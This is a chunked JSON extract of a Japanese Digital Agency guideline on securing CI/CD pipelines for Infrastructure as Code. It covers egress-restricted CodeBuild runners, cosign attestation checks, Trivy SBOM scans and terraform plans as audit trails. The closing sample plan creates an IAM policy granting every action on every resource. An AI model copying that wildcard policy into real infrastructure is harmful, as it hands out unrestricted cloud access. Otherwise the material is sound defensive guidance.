      "page_from": 33,
      "page_to": 36,
      "char_count": 1231,
      "position": 25669,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c26",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 26,
      "text": "を必要とするブランチへのレビューのRulesets による 強制などが考えられる。\n\n32 3)ビルド上での実行範囲の制限 図 49：ビルド上での実行範囲の制限 CI 定義ファイルの保護方法および権限の最小化については、パイプラインA と同様のため、ここでは省略する。 パイプラインB のビルドフェーズでは、成果物のビルド、テスト、メタデー タ生成取得、署名検証などのために多種多様なツールを用いる。依存しなけ ればならないTerraform バイナリやAWS Terraform Provider は、プラットフ ォームチームが提供するコンテナイメージを利用する。その安全性の確認に ついては、４.３4)「 依存物の安全性の担保」で説明する。 それ以外の対策としては、意図しないペイロードを取得しないよう、ビル ド環境の外部通信を制限する方法が考えられる。GitHub Actions における外 部ネットワーク通信制限は、オンプレミスのGitHub Enterprise サーバーの利 用以外にも、AWS 上のCodeBuild Project を仮想ネットワーク（AWS VPC）で ホストし、そこでGitHub Actions の稼働することでも実現できる。これによ り、外向き通信をSecurity Group やAWS Network Firewall、あるいは独自構 成のプロキシサーバーへルーティングし、記録はもとより実際の制御も可能 となる。加えて、DNS リゾルバのクエリログやVPC Flow Logs による観測性も 確保され、ネットワーク層におけるコントローラビリティが向上する。\n\n33 図 50： AWS のVPC による境界防御 次に、該当するGitHub Actions の設定とCodeBuild の設定を示す。 % cat .github/workflows/tf-plan.tf jobs: （中略） build: needs: [pre] env: ENV: ${{ needs.pre.outputs.env }} AWS_ACCOUNT: ${{ needs.pre.outputs.aws_account }} runs-on: codebuild-${{ needs.pre.outputs.env }}-infra-build-pj- ${{ github.run_id }}-${{ github.run_attempt }}-arm-3.0-small 図 51：ビルド設定内でビルド実行環境をCodeBuild に指定する記述\n\n34 図 52：CodeBuild 側のGitHub リポジトリ指定の画面 なお、未検証ではあるが、Azure でも同様の仕組みが提供されているほか、 GitLab もAWS CodeBuild との連携が可能と考えられる。 4) 依存物の安全性の担保 図 53：依存物の安全性の担保 まず、プラットフォームチームの正しいコンテナイメージを取得する必要 がある。",
      "page_from": 35,
      "page_to": 38,
      "char_count": 1275,
      "position": 26701,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c27",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 27,
      "text": "CodeBuild に指定する記述\n\n34 図 52：CodeBuild 側のGitHub リポジトリ指定の画面 なお、未検証ではあるが、Azure でも同様の仕組みが提供されているほか、 GitLab もAWS CodeBuild との連携が可能と考えられる。 4) 依存物の安全性の担保 図 53：依存物の安全性の担保 まず、プラットフォームチームの正しいコンテナイメージを取得する必要 がある。厳密なコンテナイメージを取得した場合は、GitHub Actions の外部a アクションを取得するときと同じく、一意のイメージダイジェスト（image digest）を指定することでリスクを低減できる。 また、サービスチームとしては、取得したコンテナイメージの安全性を確 認する必要がある。サービスチームにとっての安全性の定義は本書では省く が、取得した成果物の安全性確認には成果物のメタデータの完全性を確保・ 検証する必要がある。３.３2)「ソースコード・成果物の信頼性の担保」に示 すとおり、プラットフォームチームがコンテナイメージとともにSBOM やSLSA Provenance をメタデータとして生成・署名し、ECR に保管している。サービス チームはcosign ツールを用いて、これらのメタデータを署名とともに取得し、 完全性を検証する。署名の検証には、プラットフォームチーム管理下の検証 鍵（KMS）を使用する。\n\n35 % cat .github/workflows/verify-container.tf jjobs: pre: runs-on: ubuntu-latest （中略） verify-attestation: needs: [pre] env: ENV: ${{ needs.pre.outputs.env }} AWS_ACCOUNT: ${{ needs.pre.outputs.aws_account }} runs-on: codebuild-${{ needs.pre.outputs.env }}-infra-build-pj- ${{ github.run_id }}-${{ github.run_attempt }}-arm-3.0-small steps: - name: Checkout repository uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 - name: Install Cosign uses: sigstore/cosign-installer@dc72c7d5c4d10cd6bcb8cf6e3fd625a9e5e537da - name: Login to Amazon ECR id: login-ecr uses: aws-ac",
      "page_from": 37,
      "page_to": 39,
      "char_count": 1200,
      "position": 27776,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c28",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 28,
      "text": "checkout@11bd71901bbe5b1630ceea73d27597364c9af683 - name: Install Cosign uses: sigstore/cosign-installer@dc72c7d5c4d10cd6bcb8cf6e3fd625a9e5e537da - name: Login to Amazon ECR id: login-ecr uses: aws-actions/amazon-ecr- login@062b18b96a7aff071d4dc91bc00c4c1a7945b076 with: registries: \"${{ env.AWS_CENTRAL_MANAGED_ACCOUNT }}\" - name: Verify And Obtain ABOM and Attestation run: | IMAGE_DIGEST=\"${{ steps.login-ecr.outputs.registry }}/tf- image@${{ env.IMAGE_DIGEST }}\" cosign verify-attestation $IMAGE_DIGEST \\ --private-infrastructure=true \\ --key awskms:///arn:aws:kms:ap-northeast-1:xxxxxxx:alias/cosign-key \\ --type slsaprovenance02 > /tmp/downloaed-verified-attestaton.json cosign verify-attestation $IMAGE_DIGEST \\ --private-infrastructure=true \\ --key awskms:///arn:aws:kms:ap-northeast-1:xxxxxxx:alias/cosign-key \\ --type cyclonedx > /tmp/downloaed-verified-sbom.cdx.json 図 54：cosign をつかったプラットフォームチーム提供のメタデータの取得と署名検証 コンテナイメージとメタデータの完全性が担保されたら、次に安全性を確 認する手順へ移る。サービスチームの脆弱性管理方針に準拠できるか確認す るには、取得したファイルのペイロードをBase64 デコードして、実際のSBOM ファイルを取得する（図 55） 。Trivy でその内容を確認し、脆弱性管理方針に 照らし合わせ、利用可否を判断する。 % cat /tmp/downloaed-verified-sbom.cdx.json {\"payloadType\":\"application/vnd.in-toto+json\",\"payload\":\"eyJfd（",
      "page_from": 39,
      "page_to": 39,
      "char_count": 1200,
      "position": 28776,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c29",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 29,
      "text": "ファイルのペイロードをBase64 デコードして、実際のSBOM ファイルを取得する（図 55） 。Trivy でその内容を確認し、脆弱性管理方針に 照らし合わせ、利用可否を判断する。 % cat /tmp/downloaed-verified-sbom.cdx.json {\"payloadType\":\"application/vnd.in-toto+json\",\"payload\":\"eyJfd（略） 0=\",\"signatures\":[{\"keyid\":\"\",\"sig\":\"（略）\"}]} % cat /tmp/downloaed-verified-sbom.cdx.json| jq -r .payload | base64 -d | jq -r .predicate > /tmp/cdx.json % cat .github/workflows/verify-container.tf % trivy sbom /tmp/cdx.json (中略) /tmp/cdx.json (ubuntu 24.04) Total: 14 (UNKNOWN: 0, LOW: 6, MEDIUM: 8, HIGH: 0, CRITICAL: 0) (gobinary) Total: 2 (UNKNOWN: 0, LOW: 0, MEDIUM: 0, HIGH: 1, CRITICAL: 1) （略） 図 55：取得したメタデータの実際の値の取得 加えて、コンテナイメージがどのような環境とプロセスで生成されたのか\n\n36 を検証する場合は、SLSA Provenance を参照する。SBOM 同様、ペイロードを解 析することで、そのイメージのビルド環境がサービスチームの許容できるか 判断する。なお、頻度にもよるが、当該チェックについては運用負荷が高い ため、実際には自動化前提で運用設計をする必要がある。 5)ストレージ内の成果物の保護 ビルドフェーズで生成されたTfplan ファイルはS3 バケットに保存すること になる。その際、バケットのセキュリティを強化する構成が考えられるが、 S3 バケットの安全確保に関する手法はパイプラインB 特有の事項ではないた め、本章では詳細を割愛する。 ４.４デリバリフェーズの保護 図 56：デリバリフェーズの保護 1)デリバリ時に利用する主体の保護 デリバリ段階においても、ビルド環境と同様にVPC 上のAWS CodeBuild Project でGitHub Actions を実行する。ここで保護対象となる主体は、AWS CodeBuild に割り当てられるIAM ロールである。変更内容を適用するためより 強力な権限が必要となるため、ビルド時とは異なるIAM ロール（および CodeBuild プロジェクト）を用意することとなる。なお、これらの手法はパイ プラインB に特有の事項ではないため、本章では詳細を割愛する。",
      "page_from": 39,
      "page_to": 40,
      "char_count": 1240,
      "position": 29776,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c30",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 30,
      "text": "d Project でGitHub Actions を実行する。ここで保護対象となる主体は、AWS CodeBuild に割り当てられるIAM ロールである。変更内容を適用するためより 強力な権限が必要となるため、ビルド時とは異なるIAM ロール（および CodeBuild プロジェクト）を用意することとなる。なお、これらの手法はパイ プラインB に特有の事項ではないため、本章では詳細を割愛する。 2)信頼できる成果物をデリバリするための保護 すでに検証済みのTfplan ファイルと、その成果物を保管するS3 バケットの セキュリティが適切に確保されていれば、一定の信頼性を担保できる。本章 の範囲外ではあるが、サービスチームの規模拡大や複数ステークホルダーの 関与によって、ビルドフェーズの承認者とデリバリフェーズの承認者など、\n\n37 サービスチーム内の権限構成が異なる場合も想定される。そのような場合は、 第3 章「プラットフォームチームのCI/CD パイプライン」で述べたと同様に、 Tfplan ファイルへの署名やProvenance などのメタデータを生成・検証するプ ロセスを導入することが有効である。 3)デリバリ時の証跡 GitHub 上での確認は、３.４3)「デリバリ時の証跡」と同様に行える。また、 ビルドフェーズで生成されたTfplan ファイルも証跡として活用可能である。 % terraform show artifacts/tfplan Terraform used the selected providers to generate the following execution plan. Resource actions are indicated with the following symbols: + create Terraform will perform the following actions: # aws_iam_role_policy.sample will be created + resource \"aws_iam_role_policy\" \"sample\" { + id = (known after apply) + name = \"9e2364d7-6742-0855-f186-7bf225edaf7b-iam-role-policy\" + name_prefix = (known after apply) + policy = jsonencode( { + Statement = [ + { + Action = \"*\" + Effect = \"Allow\" + Resource = \"*\" }, ] + Version = \"2012-10-17\" } ) + role = \"9e2364d7-6742",
      "page_from": 40,
      "page_to": 41,
      "char_count": 1200,
      "position": 30816,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c31",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 31,
      "text": "le-policy\" + name_prefix = (known after apply) + policy = jsonencode( { + Statement = [ + { + Action = \"*\" + Effect = \"Allow\" + Resource = \"*\" }, ] + Version = \"2012-10-17\" } ) + role = \"9e2364d7-6742-0855-f186-7bf225edaf7b-iam-role\" } Plan: 1 to add, 0 to change, 0 to destroy. 図 57：Tfplan から追跡する変更内容 以上。",
      "page_from": 41,
      "page_to": 41,
      "char_count": 305,
      "position": 31816,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    }
  ],
  "keywords": [
    {
      "term": "パイプラ",
      "count": 62
    },
    {
      "term": "イン",
      "count": 28
    },
    {
      "term": "プラット",
      "count": 27
    },
    {
      "term": "フォーム",
      "count": 26
    },
    {
      "term": "サービス",
      "count": 24
    },
    {
      "term": "リポジト",
      "count": 24
    },
    {
      "term": "チームの",
      "count": 23
    },
    {
      "term": "ソースコ",
      "count": 20
    },
    {
      "term": "デリバリ",
      "count": 20
    },
    {
      "term": "ファイル",
      "count": 20
    }
  ]
}